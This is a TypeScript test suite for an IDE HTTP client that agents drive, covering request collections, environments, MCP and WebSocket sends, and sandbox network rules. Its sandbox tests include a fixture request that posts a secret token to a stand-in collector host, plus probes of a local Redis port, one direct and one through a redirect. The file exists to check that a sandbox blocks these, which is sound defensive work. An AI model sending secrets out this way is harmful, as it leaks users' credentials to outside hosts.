/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { IVoltHttpStreamEvent, IVoltHttpStreams, IVoltHttpStreamSpec } from '../../../../../platform/voltHttp/common/voltHttpStreams.js';
import assert from 'assert';
import { bufferToStream, streamToBuffer, VSBuffer } from '../../../../../base/common/buffer.js';
import { CancellationToken } from '../../../../../base/common/cancellation.js';
import { Emitter, Event } from '../../../../../base/common/event.js';
import { Schemas } from '../../../../../base/common/network.js';
import { isEqualOrParent } from '../../../../../base/common/resources.js';
import { URI } from '../../../../../base/common/uri.js';
import { IRequestContext, IRequestOptions } from '../../../../../base/parts/request/common/request.js';
import { request } from '../../../../../base/parts/request/common/requestImpl.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { FileService } from '../../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { IInstantiationService } from '../../../../../platform/instantiation/common/instantiation.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { InMemoryStorageService } from '../../../../../platform/storage/common/storage.js';
import { IVoltHttpTransport } from '../../../../../platform/voltHttp/common/voltHttpTransport.js';
import { IVoltSandboxSettings } from '../../../../../platform/voltSandbox/common/sandboxPolicy.js';
import { IVoltStdioService } from '../../../../../platform/voltStdio/common/voltStdio.js';
import { IWorkspaceContextService } from '../../../../../platform/workspace/common/workspace.js';
import { ISearchService } from '../../../../services/search/common/search.js';
import { voltExec } from '../../../../services/voltRuntime/common/execContext.js';
import { IdeCli, IIdeCapabilityContext } from '../../../voltAgent/browser/ide/capabilities/capability.js';
import { HttpCapability } from '../../../voltAgent/browser/ide/capabilities/workbenchCapabilities.js';
import { TestConfigurationService } from '../../../../../platform/configuration/test/common/testConfigurationService.js';
import { VoltHttpCollections } from '../../browser/voltHttpCollections.js';
import { VoltHttpService } from '../../browser/voltHttpService.js';

const REPO = URI.file('/tmp/v4-devrepo');

suite('Volt HTTP client for agents', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	/** What the fake server answers: `/login` a token, anything else `ok`. */
	function answer(options: IRequestOptions): { status: number; headers: Record<string, string>; body: string } {
		return { status: 200, headers: { 'content-type': 'application/json' }, body: options.url?.endsWith('/login') ? '{"token":"user-secret-token"}' : 'ok' };
	}

	function setup(respond = answer) {
		const fileService = store.add(new FileService(new NullLogService()));
		store.add(fileService.registerProvider(Schemas.file, store.add(new InMemoryFileSystemProvider())));
		const files: URI[] = [];
		const write = async (path: string, text: string) => {
			const uri = URI.file(path);
			await fileService.writeFile(uri, VSBuffer.fromString(text));
			if (!files.some(file => file.toString() === uri.toString())) {
				files.push(uri);
			}
		};
		// The agent window: no folders of its own.
		const workspace = { getWorkspace: () => ({ folders: [] }), onDidChangeWorkspaceFolders: Event.None } as unknown as IWorkspaceContextService;
		const instantiation = { createInstance: () => ({ file: (folders: URI[]) => ({ folders }) }) } as unknown as IInstantiationService;
		const search = {
			fileSearch: async (query: { folders: URI[] }) => ({ results: files.filter(file => /\.(?:http|rest)$|\.postman_(?:collection|environment)\.json$/.test(file.path) && query.folders.some(folder => isEqualOrParent(file, folder))).map(resource => ({ resource })) }),
		} as unknown as ISearchService;
		const sent: IRequestOptions[] = [];
		const requests = {
			request: async (options: IRequestOptions): Promise<IRequestContext> => {
				sent.push(options);
				const { status, headers, body } = respond(options);
				return { res: { headers, statusCode: status }, stream: bufferToStream(VSBuffer.fromString(body)) };
			},
		} as unknown as IVoltHttpTransport;
		const storage = store.add(new InMemoryStorageService());
		const http = store.add(new VoltHttpService(requests, fileService, search, workspace, storage, instantiation));
		// The connections' stand-in: `streamScript` plays the server for whatever is opened.
		const streamEvents = store.add(new Emitter<IVoltHttpStreamEvent>());
		const opened: { id: string; spec: IVoltHttpStreamSpec }[] = [];
		const fire = (event: Omit<IVoltHttpStreamEvent, 'at'>) => streamEvents.fire({ ...event, at: Date.now() });
		const streams: IVoltHttpStreams = {
			_serviceBrand: undefined,
			onDidStreamEvent: streamEvents.event,
			open: async (id, spec) => {
				opened.push({ id, spec });
				queueMicrotask(() => fire({ id, type: 'open', status: 101, text: 'Connected' }));
			},
			send: async (id, message) => {
				fire({ id, type: 'sent', data: message.data, ...(message.target ? { target: message.target } : {}) });
				// An echo server: what goes out comes back.
				fire({ id, type: 'message', data: message.data, ...(message.target ? { target: message.target } : {}) });
			},
			close: async id => fire({ id, type: 'close', code: 1000 }),
			describeGrpc: async () => [],
		};
		const collections = store.add(new VoltHttpCollections(http, streams, fileService, search, new TestConfigurationService(), instantiation));
		/** The agents' capability over this window's HTTP client. */
		const capability = () => new HttpCapability(http, collections, fileService);
		/** The stand-in search lists only the files it was told of: a file the client wrote itself is told here. */
		const track = (path: string) => { files.push(URI.file(path)); };
		return { http, collections, capability, write, track, sent, fileService, opened };
	}

	function capabilityContext(sandbox: IVoltSandboxSettings | undefined, readRefusal = async (path: string) => path.startsWith(REPO.path) && !path.endsWith('private.env.json') ? undefined : `${path} is not readable`): IIdeCapabilityContext {
		return {
			root: REPO,
			chatId: 'chat-1',
			token: CancellationToken.None,
			cli: new IdeCli({} as IVoltStdioService, REPO.fsPath, voltExec('agent-shell')),
			...(sandbox ? { confinement: { sandbox, readRefusal } } : {}),
		};
	}

	test('DEV-LIVE-2: ide http lists and sends the requests of the chat\'s folder, and sees a request file added later', async () => {
		const { http, write, capability: make } = setup();
		await write('/tmp/v4-devrepo/requests.http', '# @name health\nGET https://api.example.com/health\n');
		const capability = make();
		const list = await capability.invoke('list', {}, capabilityContext(undefined));
		assert.match(list.text, /^requests\.http {2}"requests" {2}\(\.http, 1 requests\)\n {2}GET {2}health {2}https:\/\/api\.example\.com\/health/, 'the chat\'s folder, though the window holds none');
		assert.strictEqual((await http.index()).length, 0, 'the window\'s own index is unchanged');

		// A request file the agent adds later is listed: the index is dropped when a request file changes.
		const changed = Event.toPromise(http.onDidChangeIndex);
		await write('/tmp/v4-devrepo/api/more.http', '# @name users\nGET https://api.example.com/users\n');
		await changed;
		assert.match((await capability.invoke('list', {}, capabilityContext(undefined))).text, /api\/more\.http {2}"more" {2}\(\.http, 1 requests\)\n {2}GET {2}users/);
	});

	test('DEV-SBX-14: a sandboxed chat\'s HTTP requests follow its network rules, from the URL that goes out, without redirects, the user\'s responses or files it may not read', async () => {
		const { http, write, sent, capability: make } = setup();
		await write('/tmp/v4-devrepo/requests.http', [
			'@collector = collector.example.net',
			'# @name collect',
			'POST https://{{collector}}/c',
			'',
			'{{token}}',
			'',
			'###',
			'# @name allowed',
			'GET https://api.example.com/v1',
			'',
			'###',
			'# @name chained',
			'GET https://api.example.com/me',
			'Authorization: Bearer {{login.response.body.$.token}}',
		].join('\n'));
		await write('/tmp/v4-devrepo/http-client.private.env.json', '{"dev":{"token":"from-a-file-it-may-not-read"}}');
		const capability = make();
		const offline = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com'] });

		// A named request's URL is only known once its variables are filled in: judged then.
		const collect = await capability.invoke('send', { name: 'collect' }, offline);
		assert.strictEqual(collect.isError, true);
		assert.match(collect.text, /Not sent: collector\.example\.net is not reachable: this chat's network is off\. This chat runs in Volt's sandbox/);
		const adHoc = await capability.invoke('send', { method: 'GET', url: 'localhost:6379/' }, offline);
		assert.match(adHoc.text, /Not sent: localhost:6379 is a local server on a port this chat's sandbox was not granted/);
		assert.strictEqual(sent.length, 0, 'nothing went out');

		// An allowed host goes out, without following redirects.
		const allowed = await capability.invoke('send', { name: 'allowed' }, offline);
		assert.strictEqual(allowed.isError, undefined);
		assert.deepStrictEqual(sent.map(options => [options.url, options.followRedirects]), [['https://api.example.com/v1', 0]]);

		// The user's earlier login response (a token) is not the chat's to chain from.
		await http.send({ name: 'login', method: 'POST', url: 'https://api.example.com/login', headers: [], line: 0 }, { root: REPO });
		assert.strictEqual(sent.at(-1)?.followRedirects, 5, 'the user\'s own send follows redirects as before');
		const chained = await capability.invoke('send', { name: 'chained' }, offline);
		assert.match(chained.text, /Unresolved variable: login\.response\.body\.\$\.token/);
		assert.strictEqual(sent.length, 2);

		// An environment file it may not read is not read for it.
		const envs = await capability.invoke('envs', {}, offline);
		assert.doesNotMatch(envs.text, /from-a-file/);
		assert.match((await capability.invoke('envs', {}, capabilityContext(undefined))).text, /dev {2}\[http-client\.private\.env\.json\]: token=/, 'unsandboxed: as before');

		// Network on: the chat's rules allow any host, and the request goes out.
		const online = capabilityContext({ level: 'workspace-write', network: true });
		assert.strictEqual((await capability.invoke('send', { method: 'GET', url: 'https://collector.example.net/c' }, online)).isError, undefined);
		assert.strictEqual(sent.length, 3);
	});

	test('agents build and change collections through ide http: files written, both formats, import and export', async () => {
		const { capability: make, fileService, write, track } = setup();
		const capability = make();
		const ctx = capabilityContext(undefined);
		const text = async (path: string) => (await fileService.readFile(URI.file(path))).value.toString();

		const created = await capability.invoke('create_collection', { name: 'Shop API', variables: { baseUrl: 'https://api.example.com' }, auth: { type: 'bearer', token: '{{token}}' } }, ctx);
		assert.match(created.text, /^Created http\/Shop-API\.postman_collection\.json\./);
		const path = 'http/Shop-API.postman_collection.json';
		track('/tmp/v4-devrepo/http/Shop-API.postman_collection.json');
		const saved = await capability.invoke('save_request', { path, request: 'Users/Create user', method: 'post', url: '{{baseUrl}}/users?notify=1', headers: { 'X-Trace': 'a' }, body: { name: 'Ada' }, tests: 'pm.test("created", () => pm.response.to.have.status(201));' }, ctx);
		assert.match(saved.text, /^Created Users\/Create user in http\/Shop-API\.postman_collection\.json/);
		const json = JSON.parse(await text('/tmp/v4-devrepo/http/Shop-API.postman_collection.json'));
		assert.strictEqual(json.info.schema, 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json');
		assert.deepStrictEqual(json.variable.map((row: { key: string; value: string }) => [row.key, row.value]), [['baseUrl', 'https://api.example.com']]);
		assert.strictEqual(json.auth.type, 'bearer');
		assert.deepStrictEqual([json.item[0].name, json.item[0].item[0].name, json.item[0].item[0].request.method, json.item[0].item[0].request.url.raw, json.item[0].item[0].request.body.mode], ['Users', 'Create user', 'POST', '{{baseUrl}}/users?notify=1', 'raw']);
		assert.strictEqual(json.item[0].item[0].event[0].listen, 'test');

		// Only the named fields change on an update; a rename and a move keep the rest.
		await capability.invoke('save_request', { path, request: 'Users/Create user', url: '{{baseUrl}}/v2/users', new_name: 'Create' }, ctx);
		assert.strictEqual((await capability.invoke('move', { path, request: 'Users/Create', to_folder: 'Admin/People' }, ctx)).isError, undefined);
		const got = JSON.parse((await capability.invoke('get', { path, request: 'Admin/People/Create' }, ctx)).text);
		assert.deepStrictEqual([got.method, got.url, got.headers, got.body_mode, got.auth], ['POST', '{{baseUrl}}/v2/users', { 'X-Trace': 'a' }, 'json', { type: 'inherit' }]);
		assert.match((await capability.invoke('list', {}, ctx)).text, /Shop-API\.postman_collection\.json {2}"Shop API" {2}\(postman, 1 requests\)\n {2}Users\/\n {2}Admin\/\n {4}People\/\n {6}POST {2}Create {2}\{\{baseUrl\}\}\/v2\/users/);

		// The same collection as an .http file: folders into the name, the collection's auth into the block.
		const exported = await capability.invoke('export', { path, format: 'http', to: 'shop.http' }, ctx);
		assert.match(exported.text, /^Wrote shop\.http/);
		assert.match(await text('/tmp/v4-devrepo/shop.http'), /@baseUrl = https:\/\/api\.example\.com\n\n### Admin \/ People \/ Create\nPOST \{\{baseUrl\}\}\/v2\/users\nX-Trace: a\nAuthorization: Bearer \{\{token\}\}\nContent-Type: application\/json\n\n\{\n {2}"name": "Ada"\n\}/);

		// An .http file takes requests the same way, and stays an .http file.
		await write('/tmp/v4-devrepo/requests.http', '# kept\n# @name health\nGET https://api.example.com/health\n');
		await capability.invoke('list', {}, ctx);
		await capability.invoke('save_request', { path: 'requests.http', request: 'ping', curl: 'curl -X POST https://api.example.com/ping -H "X-A: 1" -d \'{"a":1}\'' }, ctx);
		assert.strictEqual(await text('/tmp/v4-devrepo/requests.http'), '# kept\n# @name health\nGET https://api.example.com/health\n\n###\n# @name ping\nPOST https://api.example.com/ping\nX-A: 1\nContent-Type: application/json\n\n{"a":1}\n');
		assert.match((await capability.invoke('create_folder', { path: 'requests.http', folder: 'X' }, ctx)).text, /An \.http file holds requests only/);

		// Environments and imports land in the project too; a delete takes the request out of its file.
		await capability.invoke('set_env', { env: 'staging', variables: { token: 'abc', gone: null }, use: true }, ctx);
		assert.deepStrictEqual(JSON.parse(await text('/tmp/v4-devrepo/http/staging.postman_environment.json')).values.map((row: { key: string; value: string }) => [row.key, row.value]), [['token', 'abc']]);
		const imported = await capability.invoke('import', { text: JSON.stringify({ openapi: '3.0.0', info: { title: 'Pets' }, servers: [{ url: 'https://pets.example.com' }], paths: { '/pets/{id}': { get: { summary: 'Get pet', tags: ['Pets'] } } } }) }, ctx);
		assert.match(imported.text, /^Imported "Pets" \(1 request\)\. File: http\/Pets\.postman_collection\.json\.$/);
		await capability.invoke('delete', { path, request: 'Admin/People/Create' }, ctx);
		assert.doesNotMatch(await text('/tmp/v4-devrepo/http/Shop-API.postman_collection.json'), /"Create"/);

		// A sandboxed chat writes only where its sandbox lets it.
		const confined: IIdeCapabilityContext = { ...ctx, confinement: { sandbox: { level: 'workspace-write', network: false }, readRefusal: async () => undefined, writeRefusal: async (file: string) => `${file} is outside this chat's sandbox` } };
		assert.match((await capability.invoke('save_request', { path, request: 'Nope', url: 'https://api.example.com/x' }, confined)).text, /^Not changed: .* is outside this chat's sandbox\.$/);
		assert.doesNotMatch(await text('/tmp/v4-devrepo/http/Shop-API.postman_collection.json'), /Nope/);
	});

	test('DEV-SBX-15: a sandboxed chat\'s send never follows a redirect, whichever transport sends it', async () => {
		// A browser's fetch (the web workbench's request service) is told not to follow: it answers with an opaque redirect.
		const inits: RequestInit[] = [];
		const realFetch = globalThis.fetch;
		globalThis.fetch = async (_input: RequestInfo | URL, init?: RequestInit) => {
			inits.push(init ?? {});
			return new Response('ok');
		};
		try {
			await streamToBuffer((await request({ url: 'https://api.example.com/', followRedirects: 0 }, CancellationToken.None)).stream);
			await streamToBuffer((await request({ url: 'https://api.example.com/', followRedirects: 5 }, CancellationToken.None)).stream);
		} finally {
			globalThis.fetch = realFetch;
		}
		assert.deepStrictEqual(inits.map(init => init.redirect), ['manual', undefined], 'only the send that may not follow is told so');

		const offline = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com'] });
		// That opaque answer says nothing about where it points: the model is told so, not shown an empty 0.
		const opaque = setup(() => ({ status: 0, headers: {}, body: '' }));
		const hidden = await opaque.capability().invoke('send', { method: 'GET', url: 'https://api.example.com/old' }, offline);
		assert.strictEqual(hidden.isError, true);
		assert.match(hidden.text, /^GET https:\/\/api\.example\.com\/old: The server answered with a redirect, which is not followed for a sandboxed chat, and this window cannot see where it points\. Send the request to the URL it should go to/);
		assert.deepStrictEqual(opaque.sent.map(options => options.followRedirects), [0]);

		// A transport that hands back the redirect itself (the desktop app's, from the main process): shown, with the location to send next.
		const node = setup(() => ({ status: 302, headers: { location: 'http://127.0.0.1:6379/' }, body: '' }));
		const shown = await node.capability().invoke('send', { method: 'GET', url: 'https://api.example.com/old' }, offline);
		assert.match(shown.text, /^GET https:\/\/api\.example\.com\/old\n302 Found .*\n\(Not followed: this chat runs in Volt's sandbox\. Send the location to follow it; its host is judged by the chat's network rules\.\)\nlocation: http:\/\/127\.0\.0\.1:6379\//);
		assert.strictEqual(node.sent.length, 1, 'the location was not requested');
		// And sending the location is judged like any send.
		assert.match((await node.capability().invoke('send', { method: 'GET', url: 'http://127.0.0.1:6379/' }, offline)).text, /Not sent: 127\.0\.0\.1:6379 is a local server on a port this chat's sandbox was not granted/);
		assert.strictEqual(node.sent.length, 1);
	});

	test('DEV-SBX-17: a sandboxed chat picks an environment for its own send; the user\'s selection stays the user\'s', async () => {
		const { http, write, sent, capability: make } = setup();
		await write('/tmp/v4-devrepo/http-client.env.json', '{"dev":{"host":"api.example.com"},"prod":{"host":"prod.example.com"}}');
		await write('/tmp/v4-devrepo/requests.http', '# @name ping\nGET https://{{host}}/ping\n');
		http.setEnvironment('dev');
		const capability = make();
		const confined = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com', 'prod.example.com'] });

		assert.strictEqual((await capability.invoke('send', { name: 'ping', env: 'prod' }, confined)).isError, undefined);
		assert.strictEqual(sent.at(-1)?.url, 'https://prod.example.com/ping');
		assert.strictEqual(http.environment, 'dev', 'the user\'s next send still uses dev');
		assert.match((await capability.invoke('send', { name: 'ping', env: 'staging' }, confined)).text, /^No environment "staging"\. Available: dev, prod\.$/);

		// Unsandboxed: the agent's pick is the selection of the chat's project (each project keeps its own).
		await capability.invoke('send', { name: 'ping', env: 'prod' }, capabilityContext(undefined));
		assert.strictEqual(http.environmentOf(REPO), 'prod');
		assert.strictEqual(http.environment, 'dev', 'the window\'s own folders keep theirs');
	});

	test('a variable gets its new value where it is defined: the selected environment before the collection, never one nothing defines', async () => {
		const { http, collections, write, fileService } = setup();
		await write('/tmp/v4-devrepo/http-client.env.json', '{"dev":{"host":"dev.example.com","token":"t1"},"prod":{"host":"prod.example.com"}}');
		await write('/tmp/v4-devrepo/requests.http', '@host = file.example.com\n@version = v1\n\n# @name ping\nGET https://{{host}}/{{version}}/ping\n');
		const file = URI.file('/tmp/v4-devrepo/requests.http');
		const read = async (path: string) => (await fileService.readFile(URI.file(path))).value.toString();
		await collections.collections(REPO);
		http.setEnvironment('dev', REPO);

		// Both the environment and the file define `host`: the environment's value is the one in use, so it is the one changed.
		assert.strictEqual((await collections.variablesFor(REPO, file)).get('host')?.value, 'dev.example.com');
		assert.strictEqual(await collections.setVariable(REPO, file, 'host', 'new.example.com'), true);
		assert.strictEqual((await collections.variablesFor(REPO, file)).get('host')?.value, 'new.example.com');
		const env = JSON.parse(await read('/tmp/v4-devrepo/http-client.env.json'));
		assert.deepStrictEqual(env, { dev: { host: 'new.example.com', token: 't1' }, prod: { host: 'prod.example.com' } }, 'only dev\'s host changed');
		assert.match(await read('/tmp/v4-devrepo/requests.http'), /^@host = file\.example\.com$/m, 'the file keeps its own value');

		// Only the file defines `version`: it is written there, and nothing else in the file moves.
		assert.strictEqual(await collections.setVariable(REPO, file, 'version', 'v2'), true);
		assert.strictEqual(await read('/tmp/v4-devrepo/requests.http'), '@host = file.example.com\n@version = v2\n\n# @name ping\nGET https://{{host}}/{{version}}/ping\n');
		assert.strictEqual((await collections.variablesFor(REPO, file)).get('version')?.value, 'v2');

		// Defined nowhere: nothing is written.
		assert.strictEqual(await collections.setVariable(REPO, file, 'missing', 'x'), false);
		assert.strictEqual((await collections.variablesFor(REPO, file)).has('missing'), false);
	});

	test('agents send the other kinds through ide http: MCP with its session kept, a WebSocket that returns its messages, a sandboxed chat\'s connection judged by its host', async () => {
		const seen: { method?: string; session?: string }[] = [];
		const { capability: make, opened } = setup((options): { status: number; headers: Record<string, string>; body: string } => {
			const body = JSON.parse(String(options.data ?? '{}')) as { id?: number; method?: string };
			seen.push({ method: body.method, session: (options.headers as Record<string, string> | undefined)?.['Mcp-Session-Id'] });
			if (body.method === 'initialize') {
				return { status: 200, headers: { 'content-type': 'application/json', 'mcp-session-id': 's1' }, body: JSON.stringify({ jsonrpc: '2.0', id: body.id, result: { protocolVersion: '2025-06-18' } }) };
			}
			if (body.method === 'notifications/initialized') {
				return { status: 202, headers: {}, body: '' };
			}
			// A tool answer comes as an event stream.
			return { status: 200, headers: { 'content-type': 'text/event-stream' }, body: `event: message\ndata: ${JSON.stringify({ jsonrpc: '2.0', id: body.id, result: { tools: [{ name: 'echo' }] } })}\n\n` };
		});
		const capability = make();
		const open = capabilityContext(undefined);

		const mcp = await capability.invoke('send', { protocol: 'mcp', url: 'https://mcp.example.com/mcp', body: { jsonrpc: '2.0', id: 5, method: 'tools/list' } }, open);
		assert.strictEqual(mcp.isError, undefined, mcp.text);
		assert.match(mcp.text, /"name": "echo"/, 'the JSON-RPC answer, out of its event stream');
		assert.match(mcp.text, /Initialized the MCP session first \(session s1\)/);
		assert.deepStrictEqual(seen, [{ method: 'initialize', session: undefined }, { method: 'notifications/initialized', session: 's1' }, { method: 'tools/list', session: 's1' }]);
		// The next message rides the same session: no second initialize.
		await capability.invoke('send', { protocol: 'mcp', url: 'https://mcp.example.com/mcp', body: { jsonrpc: '2.0', id: 6, method: 'ping' } }, open);
		assert.deepStrictEqual(seen.slice(3), [{ method: 'ping', session: 's1' }]);

		const ws = await capability.invoke('send', { protocol: 'ws', url: 'wss://echo.example.com/socket', messages: [{ body: '{"type":"hi"}' }], wait_ms: 20 }, open);
		assert.strictEqual(ws.isError, undefined, ws.text);
		assert.match(ws.text, /^WS wss:\/\/echo\.example\.com\/socket\n101.*1 message received/);
		assert.match(ws.text, /-> \{"type":"hi"\}\n<- \{"type":"hi"\}/);
		assert.deepStrictEqual(opened.map(item => [item.spec.kind, item.spec.url]), [['ws', 'wss://echo.example.com/socket']]);

		const mqtt = await capability.invoke('send', { protocol: 'mqtt', url: 'mqtt://broker.example.com', subscribe: ['sensors/#'], messages: [{ topic: 'sensors/1', body: '21' }], wait_ms: 20 }, open);
		assert.match(mqtt.text, /-> \[sensors\/1\] 21/);
		assert.deepStrictEqual(opened[1].spec.mqtt, { subscribe: ['sensors/#'] });

		// A sandboxed chat: the connection's host is judged like a request's, before anything opens.
		const offline = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com'] });
		const refused = await capability.invoke('send', { protocol: 'ws', url: 'wss://collector.example.net/in', wait_ms: 20 }, offline);
		assert.strictEqual(refused.isError, true);
		assert.match(refused.text, /Not connected: collector\.example\.net is not reachable/);
		assert.strictEqual(opened.length, 2, 'nothing was opened for it');
	});
});
